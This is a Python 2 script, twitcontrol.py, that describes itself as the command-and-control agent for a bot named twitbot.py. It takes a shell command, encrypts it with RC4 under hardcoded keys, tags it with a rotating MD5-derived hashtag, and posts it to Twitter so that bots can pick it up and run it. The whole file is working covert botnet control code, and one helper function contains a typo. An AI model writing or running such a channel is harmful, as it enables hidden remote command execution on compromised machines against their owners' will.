#!/usr/bin/python
#
# Filename: twitcontrol.py
# Version 1.0
# This is the C&C agent for twitbot.py

""" This is the C&C agent for twitbot.py """

__author__ = 'arkem'
__version__ = '1.0'

from Crypto.Cipher import ARC4 # apt-get install python-crypto
import md5
import time
import base64
import twitter # easy_install twitter
import sys

if len(sys.argv) < 3:
    #TODO: Better scheduling (+kilosecs sucks!)
    print "Usage: twitcontrol.py +kilosecs command"
    print "Example: twitcontrol.py 3 touch /tmp/foo"
    sys.exit(1)

taglength = 10 # Tag length: longer is more unique but decreases payload size
tagkey = "Salty" # Insert strong password here
messagekey = "Sheep" # Insert strong password here
twitter_account = ("username", "password")

# To account for time drift the three least significant digets of time.time()
# are discarded. This means that every 1000 seconds the tag changes.
# TODO: Better time synchronization (Use NTP / Website (twitter?) time stamps)
def generateDynamicTag():
    tagcode = str(time.time()+int(sys.argv[1])*1000)[:7] + tagkey
    return "#" + md5.md5(tagcode).hexdigest()[:taglength - 1]

# This alternate Tag generation function has no dynamic components
# This means that bots will need to discriminate against old messages
def generateTag():
        return "#" + md5.md5(tagkey).hexdigest()[:taglenth - 1]

# The messagekey string is md5ed to spread that entropy over a slightly larger
# surface. Really this thing barely deserves to be called encrypted.
def encryptMessage(msg):
    cypher = ARC4.new(md5.md5(messagekey).hexdigest())
    return base64.b64encode(cypher.encrypt(msg))

print "Welcome to Twitcontrol...standby!"
api = twitter.Twitter(twitter_account[0], twitter_account[1])
message = " ".join(sys.argv[2:])
message = message[:int((140-taglength-1)/1.4)] # Truncate message to fit length
post = encryptMessage(message) + " " + generateDynamicTag()
api.statuses.update(status=post)
print "Twitcontrol message relayed."

